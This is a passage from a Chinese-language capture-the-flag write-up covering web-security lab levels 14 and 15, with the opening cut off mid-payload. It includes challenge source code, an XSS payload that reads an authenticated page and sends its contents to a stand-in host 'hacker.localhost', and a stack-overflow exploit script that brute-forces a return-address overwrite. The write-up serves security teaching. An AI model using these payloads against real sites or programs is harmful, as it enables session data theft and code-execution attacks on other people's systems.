20%20%7D)%20%20%20%20%20.then(data%20%3D%3E%20%7B%20%20%20%20%20%20%20%20%20console.log('Post%20response%3A'%2C%20data)%3B%20%20%20%20%20%7D)%20%20%20%20%20.catch(error%20%3D%3E%20%7B%20%20%20%20%20%20%20%20%20console.error('Error%3A'%2C%20error)%3B%20%20%20%20%20%7D)%3B%20%3C%2Fscript%3E"
response = requests.get(f'http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo={echo}')
print(response.text)
```

## level14

在上一关中，第二种方法就是这一关的解决方案。不需要获取到cookie，直接让浏览器请求info接口，然后将响应附加在自定义头中传递给hacker服务器就行。

![20240708105333](https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240708105333.png)

源码：
```python
def level14():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.path == "/login":
        if request.method == "POST":
            username = request.form.get("username")
            password = request.form.get("password")
            assert username, "Missing `username` form"
            assert password, "Missing `password` form"

            user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
            assert user, "Invalid `username` or `password`"

            session["user"] = int(user["rowid"])
            return redirect(request.path)

        return form(["username", "password"])

    if request.path == "/info":
        session_user_id = int(session.get("user", -1))
        session_user = db.execute("SELECT * FROM users WHERE rowid = ?", (session_user_id,)).fetchone()

        request_user_id = int(request.args.get("user", session_user_id))
        request_user = db.execute("SELECT * FROM users WHERE rowid = ?", (request_user_id,)).fetchone()
        assert request_user, "Invalid `user`"

        info = [request_user["username"]]
        if request_user_id == session_user_id:
            info.append(request_user["password"])
        return " ".join(info) + "\n"

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"

        with run_browser() as browser:
            browser.get(f"http://{challenge_host}/login")

            user_form = {
                "username": "flag",
                "password": flag,
            }
            for name, value in user_form.items():
                field = browser.find_element(By.NAME, name)
                field.send_keys(value)

            submit_field = browser.find_element(By.ID, "submit")
            submit_field.submit()
            WebDriverWait(browser, 10).until(EC.staleness_of(submit_field))

            browser.get(url)
            time.sleep(1)

        return "Visited\n"

    if request.path == "/echo":
        echo = request.args.get("echo")
        assert echo, "Missing `echo` argument"
        return html(echo)

    return "Not Found\n", 404
```


利用html代码
```html
<script>
    fetch('http://challenge.localhost/info', {
        method: 'GET',
        credentials: 'include'
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.text();
    })
    .then(data => {
        console.log('Info response:', data);
        return fetch('http://hacker.localhost:81', {
            method: 'GET',
            credentials: 'include',
            headers: {
                "Authorization": data
            },
        });
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    })
    .then(data => {
        console.log('Post response:', data);
    })
    .catch(error => {
        console.error('Error:', error);
    });
</script>
```


## level15

这个就是栈溢出，用win_address的地址覆盖掉greet函数的返回地址，就能显示flag了。

然后就是注意编码的问题


源码
```python
def level15():
    if "libgreet" not in globals():
        global libgreet
        shared_library_file = tempfile.NamedTemporaryFile("x", suffix=".so")
        gcc_args = ["/usr/bin/gcc", "-x", "c", "-shared", "-fPIC", "-fno-stack-protector", "-o", shared_library_file.name, "-"]
        subprocess.run(gcc_args, input=r"""
        #include <unistd.h>
        #include <fcntl.h>
        #include <stdio.h>
        #include <string.h>

        void __attribute__ ((constructor)) disable_buffering(void) {
          setvbuf(stdout, NULL, _IONBF, 0);
        }

        void win(void)
        {
          char flag[256] = { 0 };
          int flag_fd;

          puts("You win! Here is your flag:");

          flag_fd = open("/flag", 0);
          read(flag_fd, flag, sizeof(flag));
          puts(flag);
        }

        void * win_address(void)
        {
          return win;
        }

        void greet(char *name, size_t length)
        {
          char buffer[256] = { 0 };

          memcpy(buffer, "Hello, ", 7);
          memcpy(buffer + 7, name, length);
          memcpy(buffer + 7 + length, "!", 1);

          puts(buffer);
        }
        """.encode())
        libgreet = ctypes.CDLL(shared_library_file.name)
        libgreet.win_address.restype = ctypes.c_void_p

    if request.path == "/win_address":
        return f"{hex(libgreet.win_address())}\n"

    if request.path == "/greet":
        name = request.args.get("name")
        assert name, "Missing `name` argument"

        def stream_greet():
            r, w = os.pipe()
            pid = os.fork()

            if pid == 0:
                os.close(r)
                os.dup2(w, 1)
                name_buffer = ctypes.create_string_buffer(name.encode("latin"))
                libgreet.greet(name_buffer, len(name))
                os._exit(0)

            os.close(w)
            while True:
                data = os.read(r, 256)
                if not data:
                    break
                yield data
            os.wait()

        return stream_greet()

    return "Not Found\n", 404
```

利用代码
```python
hex_value = "c5 f1 29 5f 3c 7f 00 00 "

hex_value = hex_value.replace(" ", "")  # 去除空格
byte_data = bytes.fromhex(hex_value)
latin1_string = byte_data.decode('latin-1')

print("Byte data:", byte_data)
print("Latin-1 string:", latin1_string)

url = "http://challenge.localhost/greet"
for i in range(248, 300):
    data = '1' * i + latin1_string
    response = requests.get(url=url, params={"name": data})
    if "flag" in response.text:
        print(f"i is {i}")
        print(response.text)
        hex_output = response.text.encode('utf-8').hex()
        print(hex_output)
exit()
```